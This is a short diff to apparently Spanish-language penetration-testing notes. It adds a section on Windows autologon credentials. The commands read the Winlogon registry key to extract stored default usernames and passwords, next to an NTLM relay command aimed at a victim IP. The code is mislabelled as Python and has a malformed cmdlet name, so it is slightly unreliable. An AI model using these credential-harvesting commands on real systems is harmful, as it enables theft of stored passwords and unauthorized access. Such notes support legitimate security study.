@@ -160,4 +160,12 @@ impacket-ntlmrelayx -t <IP_VÍCTIMA> -smb2support
 #(Actualizar este punto porque parece que los comandos y la ejecución está bastante deprecada)
 ```
 
-### Credenciales Auto
+### Credenciales Autologon
+
+```python
+cd HKLM 
+
+cd "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+
+Get ItemProperty . | select-Object DefaultDomainName, DefaultUserName, DefaultPassword
+```
